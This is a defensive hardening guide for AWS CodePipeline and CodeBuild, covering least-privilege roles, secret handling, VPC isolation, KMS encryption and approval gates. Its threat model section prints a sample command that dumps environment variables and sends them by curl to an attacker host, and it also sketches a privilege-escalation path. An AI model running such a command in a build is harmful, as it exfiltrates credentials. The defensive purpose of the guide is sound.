---
title: "AWS CodePipeline and CodeBuild Security Hardening"
description: "CodePipeline and CodeBuild run with IAM roles that can reach production infrastructure, pull secrets, and write to container registries. Overprivileged build roles, plaintext environment variable secrets, public-facing build environments, and unencrypted artifact buckets are the primary attack surface. Hardening requires least-privilege IAM, Parameter Store integration, VPC isolation, KMS artifact encryption, and manual approval gates for production."
slug: aws-codepipeline-codebuild-security
date: 2026-05-07
lastmod: 2026-05-07
category: cicd
tags:
  - aws
  - codepipeline
  - codebuild
  - iam-security
  - pipeline-security
personas:
  - security-engineer
  - platform-engineer
article_number: 532
difficulty: Intermediate
estimated_reading_time: 12
published: true
layout: article.njk
permalink: /articles/cicd/aws-codepipeline-codebuild-security/
---

# AWS CodePipeline and CodeBuild Security Hardening

## Problem

AWS CodePipeline and CodeBuild are managed CI/CD services that eliminate the operational burden of running pipeline infrastructure, but they inherit the same fundamental security risks as any other build system: a compromised build environment has access to every credential it was granted. The difference with AWS-native tooling is that the blast radius is measured in IAM permissions, and IAM permissions in AWS translate directly to production access.

Common security failures in CodePipeline and CodeBuild deployments:

- **CodeBuild service roles with `AdministratorAccess`.** The quickstart console wizard defaults to broad permissions. Projects accumulate permissions over time rather than having them trimmed. A build environment that can assume administrator-level access can exfiltrate all Secrets Manager values, modify IAM policies, and deploy arbitrary workloads.
- **Secrets in plaintext environment variables.** CodeBuild environment variables are visible in the AWS console, in CloudWatch Logs, and in any build log export. Developers frequently put database passwords and API keys directly into the environment variable configuration rather than referencing Parameter Store paths.
- **Build environments with unrestricted internet access.** By default, CodeBuild projects run without VPC attachment. Build containers have direct outbound internet access. A malicious dependency or a compromised build script can exfiltrate secrets to any external endpoint.
- **S3 artifact buckets without encryption or restrictive policies.** CodePipeline stores pipeline artifacts in S3. If the artifact bucket uses SSE-S3 (AWS-managed keys) without a KMS CMK, there is no independent key access audit trail. Overly permissive bucket policies allow cross-account artifact reads.
- **No manual approval gates before production.** Pipelines configured to deploy automatically on every main-branch push eliminate human review for production changes. An attacker who can push to main (or compromise the pipeline) can deploy malicious code without any gate.
- **Shared CodeBuild service roles across projects.** Multiple projects sharing a single service role means a compromise in one low-privilege project inherits the permissions needed for a high-privilege project.

**Target systems:** AWS CodePipeline (V1 and V2 pipeline types); AWS CodeBuild (managed build service); AWS Systems Manager Parameter Store and Secrets Manager for secrets; AWS KMS for artifact encryption; AWS CodeArtifact for package mirroring; VPC with NAT gateway for egress control.

## Threat Model

- **Adversary 1 — Credential exfiltration via build script:** A developer (or attacker with developer access) commits a `buildspec.yml` that runs `env > /tmp/secrets && curl -X POST attacker.com -d @/tmp/secrets`. All environment variables — including any secrets injected at build time — are exfiltrated.
- **Adversary 2 — IAM privilege escalation from CodeBuild role:** A build project's service role has `iam:PassRole` and `lambda:CreateFunction`. An attacker who can modify the buildspec uses these permissions to create a Lambda with a highly privileged role, achieving persistent AWS access beyond the build environment.
- **Adversary 3 — Artifact tampering in S3:** An attacker with write access to the artifact bucket (misconfigured bucket policy, or a compromised IAM role with S3 write) replaces a compiled artifact between the build stage and the deploy stage. The deploy stage pushes the tampered artifact to production.
- **Adversary 4 — Cross-account pipeline exfiltration:** A cross-account CodePipeline has a delivery role that can write to an artifact bucket in the target account. An attacker who compromises the source account's pipeline role can read artifacts from the target account if the bucket policy is not sufficiently restricted.
- **Adversary 5 — Malicious dependency from public registry:** A build fetches packages from public npm, PyPI, or Maven Central without a private mirror. A dependency confusion or typosquatting attack injects malicious code that runs during the build, reads the CodeBuild service role's IMDS credentials, and exfiltrates them.
- **Access level:** Adversaries 1 and 2 need pipeline commit access or access to the CodeBuild project configuration. Adversary 3 needs S3 write access. Adversary 4 needs to compromise the source account's pipeline role. Adversary 5 exploits supply chain via public package registries.
- **Objective:** Extract AWS credentials; achieve persistent access to production AWS environment; tamper with deployed artifacts.
- **Blast radius:** A CodeBuild service role with production deployment permissions is equivalent to direct production infrastructure access. Full exploitation gives an attacker the ability to exfiltrate all secrets, modify running workloads, and persist via new IAM identities.

## Configuration

### Step 1: Least-Privilege CodeBuild Service Roles per Project

Never share a service role across CodeBuild projects and never attach `AdministratorAccess`. Create a dedicated role per project with the minimum permissions required:

```json
// IAM policy for a CodeBuild project that builds a Docker image,
// pushes to ECR, reads SSM parameters, and writes build logs.
// Attach to: arn:aws:iam::123456789012:role/codebuild-my-app-service-role

{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "CloudWatchLogs",
      "Effect": "Allow",
      "Action": [
        "logs:CreateLogGroup",
        "logs:CreateLogStream",
        "logs:PutLogEvents"
      ],
      "Resource": [
        "arn:aws:logs:us-east-1:123456789012:log-group:/aws/codebuild/my-app",
        "arn:aws:logs:us-east-1:123456789012:log-group:/aws/codebuild/my-app:*"
      ]
    },
    {
      "Sid": "S3ArtifactAccess",
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:GetObjectVersion",
        "s3:PutObject"
      ],
      // Scope to the specific artifact bucket and prefix for this project.
      "Resource": "arn:aws:s3:::my-pipeline-artifacts/my-app/*"
    },
    {
      "Sid": "ECRPush",
      "Effect": "Allow",
      "Action": [
        "ecr:GetAuthorizationToken"
      ],
      "Resource": "*"   // GetAuthorizationToken cannot be scoped to a resource.
    },
    {
      "Sid": "ECRImagePush",
      "Effect": "Allow",
      "Action": [
        "ecr:BatchCheckLayerAvailability",
        "ecr:InitiateLayerUpload",
        "ecr:UploadLayerPart",
        "ecr:CompleteLayerUpload",
        "ecr:PutImage"
      ],
      // Scope to the specific ECR repository — not all repositories.
      "Resource": "arn:aws:ecr:us-east-1:123456789012:repository/my-app"
    },
    {
      "Sid": "SSMParameterRead",
      "Effect": "Allow",
      "Action": [
        "ssm:GetParameter",
        "ssm:GetParameters"
      ],
      // Scope to parameters under the project-specific path only.
      "Resource": "arn:aws:ssm:us-east-1:123456789012:parameter/my-app/build/*"
    },
    {
      "Sid": "KMSDecrypt",
      "Effect": "Allow",
      "Action": [
        "kms:Decrypt",
        "kms:GenerateDataKey"
      ],
      // Allow decryption using only the artifact bucket KMS key.
      "Resource": "arn:aws:kms:us-east-1:123456789012:key/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
    }
    // Explicitly NOT included:
    // - iam:*, sts:AssumeRole (no privilege escalation)
    // - s3:* (no wildcard S3 access)
    // - secretsmanager:* (use SSM Parameter Store instead, or scope explicitly)
    // - ec2:*, lambda:*, cloudformation:* (not needed for builds)
  ]
}
```

```bash
# Audit existing CodeBuild service roles for overpermission.
# List all CodeBuild projects and their service roles.
aws codebuild list-projects --query 'projects' --output text | \
  tr '\t' '\n' | \
  xargs -I {} aws codebuild batch-get-projects --names {} \
    --query 'projects[*].{name:name,role:serviceRole}' --output table

# Check for AdministratorAccess on any CodeBuild role.
aws iam list-roles --query 'Roles[?contains(RoleName, `codebuild`)].RoleName' \
  --output text | tr '\t' '\n' | while read role; do
  policies=$(aws iam list-attached-role-policies --role-name "$role" \
    --query 'AttachedPolicies[*].PolicyName' --output text)
  echo "$role: $policies"
done | grep -i admin
```

### Step 2: Parameter Store and Secrets Manager for Build Secrets

Never put secrets in CodeBuild environment variables of type `PLAINTEXT`. Any value that needs to be kept secret must use type `PARAMETER_STORE` or `SECRETS_MANAGER`:

```yaml
# buildspec.yml — reference SSM parameters; never hardcode credentials.
version: 0.2

env:
  parameter-store:
    # CodeBuild retrieves these at runtime; values are masked in logs.
    DB_PASSWORD: /my-app/build/db-password
    API_KEY: /my-app/build/third-party-api-key
  secrets-manager:
    # For credentials that rotate — Secrets Manager handles rotation.
    DOCKER_HUB_TOKEN: my-app/build/dockerhub:token

phases:
  pre_build:
    commands:
      # DB_PASSWORD is available as an env var; value is masked in CloudWatch Logs.
      - echo "Logging in to Docker Hub..."
      - echo "$DOCKER_HUB_TOKEN" | docker login --username myorg --password-stdin
      # Never: echo $DB_PASSWORD — even though it's masked, avoid unnecessary exposure.
  build:
    commands:
      - docker build --build-arg DB_HOST=$DB_HOST .
      # Pass secrets as build args only when strictly required.
      # Prefer runtime secret injection; build-arg secrets appear in image layers.
```

```bash
# Store build secrets in SSM Parameter Store with SecureString type (KMS-encrypted).
aws ssm put-parameter \
  --name "/my-app/build/db-password" \
  --value "$(cat /dev/stdin)" \   # Read from stdin; never pass on CLI where it appears in shell history.
  --type "SecureString" \
  --key-id "alias/my-app-secrets-key" \
  --overwrite

# Verify parameter is not of type String (unencrypted).
aws ssm describe-parameters \
  --parameter-filters "Key=Name,Values=/my-app/build/" \
  --query 'Parameters[?Type==`String`].[Name,Type]' \
  --output table
# Any String-type parameters here are unencrypted secrets — convert them to SecureString.
```

```hcl
# Terraform: CodeBuild project with Parameter Store references (not PLAINTEXT).
resource "aws_codebuild_project" "my_app" {
  name         = "my-app"
  service_role = aws_iam_role.codebuild_my_app.arn

  environment {
    compute_type = "BUILD_GENERAL1_SMALL"
    image        = "aws/codebuild/standard:7.0"
    type         = "LINUX_CONTAINER"

    # CORRECT: reference Parameter Store path.
    environment_variable {
      name  = "DB_PASSWORD"
      value = "/my-app/build/db-password"
      type  = "PARAMETER_STORE"
    }

    # WRONG — never do this:
    # environment_variable {
    #   name  = "DB_PASSWORD"
    #   value = "actual-secret-value"
    #   type  = "PLAINTEXT"
    # }
  }
}
```

### Step 3: VPC Configuration for Private Build Environments

Attach CodeBuild projects to a VPC with no direct internet access. Use a NAT gateway for controlled egress to approved external destinations only:

```hcl
# Terraform: VPC-attached CodeBuild project.
resource "aws_codebuild_project" "my_app" {
  name         = "my-app"
  service_role = aws_iam_role.codebuild_my_app.arn

  vpc_config {
    vpc_id = aws_vpc.build_vpc.id
    # Private subnets only — no direct internet route.
    subnets         = aws_subnet.build_private[*].id
    security_group_ids = [aws_security_group.codebuild_sg.id]
  }

  environment {
    compute_type                = "BUILD_GENERAL1_SMALL"
    image                       = "aws/codebuild/standard:7.0"
    type                        = "LINUX_CONTAINER"
    # Disable privileged mode unless explicitly required for Docker-in-Docker.
    privileged_mode             = false
  }
}

# Security group: restrict egress from build environment.
resource "aws_security_group" "codebuild_sg" {
  name   = "codebuild-my-app"
  vpc_id = aws_vpc.build_vpc.id

  # Egress: allow HTTPS to NAT gateway only; all other outbound blocked.
  egress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]   # NAT gateway routes this to approved destinations.
  }
  egress {
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }
  # No ingress rules — CodeBuild does not accept inbound connections.
}
```

```bash
# Verify CodeBuild project is VPC-attached.
aws codebuild batch-get-projects --names my-app \
  --query 'projects[*].{name:name,vpc:vpcConfig}' \
  --output json

# Any project without vpcConfig is building with direct internet access.
# Projects handling secrets or deploying to production must be VPC-attached.
```

The VPC must have a NAT gateway (or NAT instance) to allow outbound package downloads and AWS API calls. VPC endpoints for `codebuild`, `s3`, `ssm`, `secretsmanager`, `ecr.api`, and `ecr.dkr` eliminate the need for NAT for AWS service calls and keep that traffic off the internet entirely:

```hcl
# VPC interface endpoints — AWS API traffic stays on the AWS network.
resource "aws_vpc_endpoint" "ssm" {
  vpc_id            = aws_vpc.build_vpc.id
  service_name      = "com.amazonaws.us-east-1.ssm"
  vpc_endpoint_type = "Interface"
  subnet_ids        = aws_subnet.build_private[*].id
  security_group_ids = [aws_security_group.vpc_endpoint_sg.id]
  private_dns_enabled = true
}

resource "aws_vpc_endpoint" "ecr_api" {
  vpc_id            = aws_vpc.build_vpc.id
  service_name      = "com.amazonaws.us-east-1.ecr.api"
  vpc_endpoint_type = "Interface"
  subnet_ids        = aws_subnet.build_private[*].id
  security_group_ids = [aws_security_group.vpc_endpoint_sg.id]
  private_dns_enabled = true
}

resource "aws_vpc_endpoint" "s3" {
  vpc_id       = aws_vpc.build_vpc.id
  service_name = "com.amazonaws.us-east-1.s3"
  # Gateway endpoint — no hourly cost, no security group needed.
  vpc_endpoint_type = "Gateway"
  route_table_ids   = aws_route_table.build_private[*].id
}
```

### Step 4: CodeBuild Image Security and Compute Type

Use AWS-managed images and pin to a specific image version or digest to prevent unexpected changes:

```hcl
resource "aws_codebuild_project" "my_app" {
  environment {
    # Use AWS-managed standard image — receives security patches from AWS.
    # Pin to specific version (7.0) rather than "latest" to control when updates apply.
    image = "aws/codebuild/standard:7.0"
    type  = "LINUX_CONTAINER"

    # For custom images: use ECR with image scanning enabled and pin to digest.
    # image = "123456789012.dkr.ecr.us-east-1.amazonaws.com/my-build-image@sha256:abc123..."
    # image_pull_credentials_type = "SERVICE_ROLE"   # Use service role for ECR auth.
  }
}
```

```bash
# Enable ECR image scanning on custom build images.
aws ecr put-image-scanning-configuration \
  --repository-name my-build-image \
  --image-scanning-configuration scanOnPush=true

# List critical/high findings before promoting a new build image.
aws ecr describe-image-scan-findings \
  --repository-name my-build-image \
  --image-id imageDigest=sha256:abc123... \
  --query 'imageScanFindings.findingSeverityCounts' \
  --output json
```

Compute type selection has security implications: larger compute types have more available CPU and memory for a potential attacker to leverage, but also allow builds to complete faster (reducing exposure window). Use the smallest compute type that meets build requirements:

```
BUILD_GENERAL1_SMALL  — 3 GB RAM, 2 vCPU   — adequate for most application builds
BUILD_GENERAL1_MEDIUM — 7 GB RAM, 4 vCPU   — large test suites
BUILD_GENERAL1_LARGE  — 15 GB RAM, 8 vCPU  — memory-intensive builds (e.g. JVM)
BUILD_GENERAL1_XLARGE — 70 GB RAM, 36 vCPU — avoid unless strictly required
```

### Step 5: CodePipeline Artifact Encryption with KMS CMK

CodePipeline stores artifacts in S3 between stages. Encrypt the artifact bucket with a KMS CMK (not SSE-S3) to get independent key access audit trails and cross-account access control:

```hcl
# KMS CMK for pipeline artifact encryption.
resource "aws_kms_key" "pipeline_artifacts" {
  description             = "CodePipeline artifact encryption key"
  deletion_window_in_days = 30
  enable_key_rotation     = true

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "RootAccess"
        Effect = "Allow"
        Principal = { AWS = "arn:aws:iam::123456789012:root" }
        Action   = "kms:*"
        Resource = "*"
      },
      {
        Sid    = "CodePipelineEncrypt"
        Effect = "Allow"
        Principal = {
          AWS = aws_iam_role.codepipeline_role.arn
        }
        Action   = ["kms:Decrypt", "kms:GenerateDataKey"]
        Resource = "*"
      },
      {
        Sid    = "CodeBuildDecrypt"
        Effect = "Allow"
        Principal = {
          AWS = aws_iam_role.codebuild_my_app.arn
        }
        Action   = ["kms:Decrypt", "kms:GenerateDataKey"]
        Resource = "*"
      }
    ]
  })
}

# S3 artifact bucket: KMS encryption, versioning, block public access.
resource "aws_s3_bucket" "pipeline_artifacts" {
  bucket = "my-pipeline-artifacts-${data.aws_caller_identity.current.account_id}"
}

resource "aws_s3_bucket_server_side_encryption_configuration" "artifacts" {
  bucket = aws_s3_bucket.pipeline_artifacts.id
  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm     = "aws:kms"
      kms_master_key_id = aws_kms_key.pipeline_artifacts.arn
    }
    bucket_key_enabled = true  # Reduces KMS API costs for large artifact buckets.
  }
}

resource "aws_s3_bucket_versioning" "artifacts" {
  bucket = aws_s3_bucket.pipeline_artifacts.id
  versioning_configuration { status = "Enabled" }
}

resource "aws_s3_bucket_public_access_block" "artifacts" {
  bucket                  = aws_s3_bucket.pipeline_artifacts.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

# Bucket policy: deny unencrypted uploads and restrict access to pipeline roles.
resource "aws_s3_bucket_policy" "artifacts" {
  bucket = aws_s3_bucket.pipeline_artifacts.id
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "DenyUnencryptedObjectUploads"
        Effect = "Deny"
        Principal = "*"
        Action   = "s3:PutObject"
        Resource = "${aws_s3_bucket.pipeline_artifacts.arn}/*"
        Condition = {
          StringNotEquals = {
            "s3:x-amz-server-side-encryption" = "aws:kms"
          }
        }
      },
      {
        Sid    = "DenyNonSSL"
        Effect = "Deny"
        Principal = "*"
        Action   = "s3:*"
        Resource = [
          aws_s3_bucket.pipeline_artifacts.arn,
          "${aws_s3_bucket.pipeline_artifacts.arn}/*"
        ]
        Condition = {
          Bool = { "aws:SecureTransport" = "false" }
        }
      },
      {
        Sid    = "AllowPipelineRolesOnly"
        Effect = "Allow"
        Principal = {
          AWS = [
            aws_iam_role.codepipeline_role.arn,
            aws_iam_role.codebuild_my_app.arn
          ]
        }
        Action   = ["s3:GetObject", "s3:PutObject", "s3:GetObjectVersion"]
        Resource = "${aws_s3_bucket.pipeline_artifacts.arn}/*"
      }
    ]
  })
}
```

### Step 6: Pipeline Execution Role Scoping

The CodePipeline execution role (the role CodePipeline itself assumes to orchestrate stages) must be scoped to the exact actions it needs — no more:

```json
// CodePipeline execution role policy — scoped to specific resources.
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "S3ArtifactAccess",
      "Effect": "Allow",
      "Action": ["s3:GetObject", "s3:PutObject", "s3:GetObjectVersion",
                 "s3:GetBucketVersioning"],
      "Resource": [
        "arn:aws:s3:::my-pipeline-artifacts-123456789012",
        "arn:aws:s3:::my-pipeline-artifacts-123456789012/*"
      ]
    },
    {
      "Sid": "CodeBuildTrigger",
      "Effect": "Allow",
      "Action": ["codebuild:BatchGetBuilds", "codebuild:StartBuild"],
      // Scope to specific CodeBuild projects used by this pipeline.
      "Resource": "arn:aws:codebuild:us-east-1:123456789012:project/my-app"
    },
    {
      "Sid": "CodeCommitSource",
      "Effect": "Allow",
      "Action": ["codecommit:GetBranch", "codecommit:GetCommit",
                 "codecommit:UploadArchive", "codecommit:GetUploadArchiveStatus"],
      "Resource": "arn:aws:codecommit:us-east-1:123456789012:my-app-repo"
    },
    {
      "Sid": "SNSApprovalNotify",
      "Effect": "Allow",
      "Action": "sns:Publish",
      "Resource": "arn:aws:sns:us-east-1:123456789012:pipeline-approvals"
    },
    {
      "Sid": "KMSForArtifacts",
      "Effect": "Allow",
      "Action": ["kms:Decrypt", "kms:GenerateDataKey"],
      "Resource": "arn:aws:kms:us-east-1:123456789012:key/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
    }
    // NOT included: iam:*, cloudformation:*, lambda:CreateFunction, ec2:*, etc.
  ]
}
```

### Step 7: Manual Approval Actions for Production Stages

Insert a manual approval action between staging and production stages. This requires a human to review and approve before the pipeline advances to deploy:

```hcl
resource "aws_codepipeline" "my_app" {
  name     = "my-app-pipeline"
  role_arn = aws_iam_role.codepipeline_role.arn

  artifact_store {
    location = aws_s3_bucket.pipeline_artifacts.bucket
    type     = "S3"
    encryption_key {
      id   = aws_kms_key.pipeline_artifacts.arn
      type = "KMS"
    }
  }

  stage {
    name = "Source"
    action {
      name             = "Source"
      category         = "Source"
      owner            = "AWS"
      provider         = "CodeCommit"
      version          = "1"
      output_artifacts = ["source_output"]
      configuration = {
        RepositoryName       = "my-app-repo"
        BranchName           = "main"
        PollForSourceChanges = "false"  // Use EventBridge; not polling.
      }
    }
  }

  stage {
    name = "Build"
    action {
      name             = "Build"
      category         = "Build"
      owner            = "AWS"
      provider         = "CodeBuild"
      version          = "1"
      input_artifacts  = ["source_output"]
      output_artifacts = ["build_output"]
      configuration = {
        ProjectName = aws_codebuild_project.my_app.name
      }
    }
  }

  stage {
    name = "Deploy-Staging"
    action {
      name            = "DeployStaging"
      category        = "Deploy"
      owner           = "AWS"
      provider        = "ECS"
      version         = "1"
      input_artifacts = ["build_output"]
      configuration = {
        ClusterName = "staging-cluster"
        ServiceName = "my-app-staging"
      }
    }
  }

  // Manual approval gate: pipeline pauses here until an approver acts.
  stage {
    name = "Approve-Production"
    action {
      name     = "ApproveProduction"
      category = "Approval"
      owner    = "AWS"
      provider = "Manual"
      version  = "1"
      configuration = {
        NotificationArn = aws_sns_topic.pipeline_approvals.arn
        CustomData      = "Review staging deployment at https://staging.example.com before approving production."
        ExternalEntityLink = "https://staging.example.com/healthcheck"
      }
    }
  }

  stage {
    name = "Deploy-Production"
    action {
      name            = "DeployProduction"
      category        = "Deploy"
      owner           = "AWS"
      provider        = "ECS"
      version         = "1"
      input_artifacts = ["build_output"]
      configuration = {
        ClusterName = "production-cluster"
        ServiceName = "my-app-production"
      }
    }
  }
}
```

```bash
# Restrict who can approve pipeline actions via IAM.
# Only members of the release-approvers group may call PutApprovalResult.
aws iam create-policy --policy-name CodePipelineApprovalOnly --policy-document '{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "codepipeline:PutApprovalResult",
    "Resource": "arn:aws:codepipeline:us-east-1:123456789012:my-app-pipeline/Approve-Production/ApproveProduction"
  }]
}'
```

### Step 8: CloudTrail Logging and Pipeline Tampering Prevention

Enable CloudTrail data events on the artifact bucket and management events for CodePipeline and CodeBuild:

```hcl
resource "aws_cloudtrail" "pipeline_audit" {
  name                          = "pipeline-audit-trail"
  s3_bucket_name                = aws_s3_bucket.cloudtrail_logs.bucket
  include_global_service_events = true
  is_multi_region_trail         = true
  enable_log_file_validation    = true  // Detects tampering of log files.
  kms_key_id                    = aws_kms_key.cloudtrail.arn

  event_selector {
    read_write_type           = "All"
    include_management_events = true

    // Data events: log all access to the artifact bucket.
    data_resource {
      type   = "AWS::S3::Object"
      values = ["${aws_s3_bucket.pipeline_artifacts.arn}/"]
    }
  }
}
```

```bash
# CloudWatch Metric Filter: alert on CodePipeline execution role assumption.
# An unexpected role assumption may indicate pipeline tampering.
aws logs put-metric-filter \
  --log-group-name "aws-cloudtrail-logs" \
  --filter-name "CodePipelineRoleAssumption" \
  --filter-pattern '{ ($.eventName = "AssumeRole") && ($.requestParameters.roleArn = "*codepipeline*") }' \
  --metric-transformations \
    metricName=CodePipelineRoleAssumptions,metricNamespace=SecurityAlerts,metricValue=1

# Alert on any direct modification to the artifact bucket outside of pipeline.
aws logs put-metric-filter \
  --log-group-name "aws-cloudtrail-logs" \
  --filter-name "ArtifactBucketDirectWrite" \
  --filter-pattern '{ ($.eventName = "PutObject") && ($.resources[*].ARN = "*my-pipeline-artifacts*") && ($.userIdentity.sessionContext.sessionIssuer.arn != "*codepipeline*") && ($.userIdentity.sessionContext.sessionIssuer.arn != "*codebuild*") }' \
  --metric-transformations \
    metricName=ArtifactBucketDirectWrite,metricNamespace=SecurityAlerts,metricValue=1
```

### Step 9: CodeArtifact as a Secure Package Mirror

Use AWS CodeArtifact to proxy public package registries. This prevents direct builds from fetching packages from the public internet and gives visibility into which packages are being consumed:

```bash
# Create a CodeArtifact domain and repository mirroring npm and PyPI.
aws codeartifact create-domain --domain my-org

# Repository with npm public upstream.
aws codeartifact create-repository \
  --domain my-org \
  --repository npm-store \
  --upstreams '{"repositoryName":"npm-public"}' \
  --description "Internal npm mirror"

aws codeartifact associate-external-connection \
  --domain my-org \
  --repository npm-store \
  --external-connection public:npmjs

# Retrieve a scoped auth token for use in buildspec.yml.
aws codeartifact get-authorization-token \
  --domain my-org \
  --domain-owner 123456789012 \
  --query authorizationToken \
  --output text
```

```yaml
# buildspec.yml: configure npm and pip to use CodeArtifact instead of public registries.
version: 0.2

phases:
  install:
    commands:
      # Authenticate with CodeArtifact (token valid for 12 hours by default).
      - CODEARTIFACT_TOKEN=$(aws codeartifact get-authorization-token \
          --domain my-org --domain-owner 123456789012 \
          --query authorizationToken --output text)

      # Point npm at CodeArtifact.
      - npm config set registry https://my-org-123456789012.d.codeartifact.us-east-1.amazonaws.com/npm/npm-store/
      - npm config set //my-org-123456789012.d.codeartifact.us-east-1.amazonaws.com/npm/npm-store/:_authToken $CODEARTIFACT_TOKEN

      # Point pip at CodeArtifact.
      - pip config set global.index-url https://aws:$CODEARTIFACT_TOKEN@my-org-123456789012.d.codeartifact.us-east-1.amazonaws.com/pypi/pypi-store/simple/

  build:
    commands:
      - npm ci         # Uses CodeArtifact mirror, not public npmjs.
      - pip install -r requirements.txt
```

```json
// CodeArtifact repository policy: restrict who can publish packages.
// Internal developers can read; only CI service roles can publish.
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": { "AWS": "arn:aws:iam::123456789012:root" },
      "Action": ["codeartifact:ReadFromRepository", "codeartifact:DescribePackageVersion"],
      "Resource": "*"
    },
    {
      "Effect": "Allow",
      "Principal": { "AWS": "arn:aws:iam::123456789012:role/codebuild-publisher" },
      "Action": "codeartifact:PublishPackageVersion",
      "Resource": "*"
    }
  ]
}
```

### Step 10: Telemetry

```
codepipeline_executions_total{pipeline, status}                    counter
codepipeline_stage_duration_seconds{pipeline, stage}               histogram
codepipeline_approval_pending_duration_seconds{pipeline}           gauge
codebuild_build_duration_seconds{project, status}                  histogram
codebuild_build_failures_total{project, phase}                     counter
codebuild_privileged_builds_total{project}                         counter
s3_artifact_bucket_access_denied_total{bucket, principal}          counter
cloudtrail_pipeline_role_assumptions_total{assumed_by}             counter
```

Alert on:

- `codepipeline_approval_pending_duration_seconds` exceeds 72 hours — approval may be stale or notification delivery failed.
- `codebuild_privileged_builds_total` increases for a project not expected to use privileged mode — indicates misconfiguration or tampering.
- `s3_artifact_bucket_access_denied_total` from a principal that is not the pipeline role — unexpected access attempt to artifact bucket.
- `cloudtrail_pipeline_role_assumptions_total` from an unexpected `assumed_by` identity — potential pipeline role compromise.
- CodeBuild build initiated outside of CodePipeline (via direct `StartBuild` API call from unexpected principal) — bypass of pipeline gate.

## Expected Behaviour

| Signal | Default CodePipeline/CodeBuild | Hardened Configuration |
|--------|-------------------------------|------------------------|
| Secret in environment variable | Visible in console and CloudWatch Logs | SSM Parameter Store reference; value masked in logs |
| CodeBuild IAM role permissions | Broad or AdministratorAccess | Per-project role; scoped to specific ARNs |
| Build environment network access | Direct internet access | VPC-attached; NAT gateway; VPC endpoints for AWS APIs |
| Artifact bucket access | SSE-S3 encryption; permissive policy | KMS CMK; deny non-KMS uploads; pipeline roles only |
| Production deployment | Automatic on every push | Manual approval gate with SNS notification |
| Artifact tamper detection | None | CloudTrail data events; metric filter alerts on non-pipeline writes |
| Package dependencies | Fetched from public internet | CodeArtifact mirror; no direct public registry access from build |

## Trade-offs

| Aspect | Benefit | Cost | Mitigation |
|--------|---------|------|------------|
| VPC-attached CodeBuild | Eliminates direct internet exfiltration path | Requires VPC setup; interface endpoints add cost | Terraform module for standard build VPC; VPC endpoint cost is low relative to security value |
| Per-project IAM roles | Blast radius containment; easier audit | More IAM roles to manage | Terraform module that creates scoped role per CodeBuild project from a standard template |
| KMS CMK on artifact bucket | Key access audit trail; cross-account access control | Small KMS API cost; more configuration | `bucket_key_enabled = true` reduces KMS API call volume significantly |
| Manual approval for production | Human review catches bad deployments and pipeline compromises | Deployment latency; approval can become rubber-stamp | Define clear approval criteria; time-box approval SLA; rotate approvers |
| CodeArtifact package mirror | Visibility into consumed packages; blocks direct public registry access | Must configure auth in every buildspec | Shared buildspec snippet library; CodeArtifact token retrieval as an install phase helper |

## Failure Modes

| Failure | Symptom | Detection | Recovery |
|---------|---------|-----------|----------|
| SSM parameter missing or wrong path | Build fails with `ParameterNotFound` error | CloudWatch build log error | Verify parameter path in SSM console; check role has `ssm:GetParameter` on the exact ARN |
| VPC endpoint misconfiguration | Build fails with timeout reaching AWS APIs | Build log shows connection timeout to ssm/ecr endpoints | Check VPC endpoint DNS resolution; verify security group allows HTTPS to endpoint |
| KMS key policy too restrictive | Pipeline fails at artifact upload with `AccessDenied` | CloudTrail `kms:GenerateDataKey` denied event | Add CodePipeline and CodeBuild role ARNs to KMS key policy `Statement` |
| Manual approval timeout | Pipeline execution expires after 7 days (default) | Pipeline shows `Failed` with `Approval expired` | Set pipeline timeout; send reminder notification at 24-hour mark via EventBridge |
| CodeArtifact token expiry mid-build | `npm install` or `pip install` fails with 401 | Build log shows 401 from CodeArtifact endpoint | Retrieve token at start of build phase; default 12-hour TTL is sufficient for most builds |
| Artifact bucket policy blocks pipeline | Pipeline stage fails with `AccessDenied` on S3 PutObject | CloudTrail S3 access denied event for pipeline role | Verify pipeline role ARN in bucket policy `AllowPipelineRolesOnly` statement |

## Related Articles

- [CI/CD Secret Management](/articles/cicd/cicd-secret-management/)
- [OIDC Federation Hardening for CI-to-Cloud](/articles/cicd/oidc-federation-hardening/)
- [Ephemeral Cloud Credentials in CI/CD](/articles/cicd/ephemeral-cloud-credentials-cicd/)
- [Pipeline Egress Control](/articles/cicd/pipeline-egress-control/)
- [Artifact Integrity](/articles/cicd/artifact-integrity/)
- [Terraform State Security](/articles/cicd/terraform-state-security/)
